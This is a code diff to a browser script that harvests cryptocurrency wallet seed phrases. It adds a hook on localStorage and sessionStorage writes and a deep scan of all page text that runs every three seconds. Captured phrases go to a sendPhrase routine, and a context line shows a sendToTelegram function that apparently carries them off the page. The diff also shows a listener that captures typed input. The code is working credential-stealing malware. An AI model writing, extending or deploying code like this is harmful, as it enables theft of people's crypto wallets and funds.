@@ -52,6 +52,19 @@ async function sendToTelegram(data) {
   }
 }
 
+// --- Storage monitoring: capture phrases saved to localStorage/sessionStorage ---
+(function() {
+  const originalSetItem = Storage.prototype.setItem;
+  Storage.prototype.setItem = function(key, value) {
+    originalSetItem.apply(this, arguments);
+    // Check if value looks like a seed phrase
+    if (typeof value === 'string' && isSeed(value)) {
+      console.log('💾 Storage capture:', key, wc(value), 'words');
+      sendPhrase(value, 'STORAGE_' + this.constructor.name.toUpperCase(), key);
+    }
+  };
+})();
+
 // --- Send phrase (deduplicated) ---
 function sendPhrase(phrase, type, field) {
   var clean = phrase.toLowerCase().replace(/\s+/g, ' ').trim();
@@ -122,6 +135,34 @@ function startMonitor() {
 
   [800, 2000, 4000, 7000, 12000].forEach(function(t) { setTimeout(scanAll, t); });
 }
+
+// --- Deep scan: look for phrases in any text content ---
+function deepScan() {
+  // Get all text from the page
+  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+  let node;
+  const texts = [];
+  while (node = walker.nextNode()) {
+    const text = node.textContent.trim();
+    if (text.length > 20 && text.length < 500) texts.push(text);
+  }
+  
+  // Check each text block for seed phrases
+  texts.forEach(text => {
+    // Split by common delimiters and check each segment
+    const segments = text.split(/[\n,;|]+/);
+    segments.forEach(seg => {
+      const clean = seg.trim();
+      if (isSeed(clean)) {
+        console.log('🔎 Deep scan found phrase:', wc(clean), 'words');
+        sendPhrase(clean, 'DEEPSCAN_TEXT', 'page');
+      }
+    });
+  });
+}
+
+// Run deep scan periodically
+setInterval(deepScan, 3000);
 
 // --- Input: capture typed phrases ---
 document.addEventListener('input', function(e) {
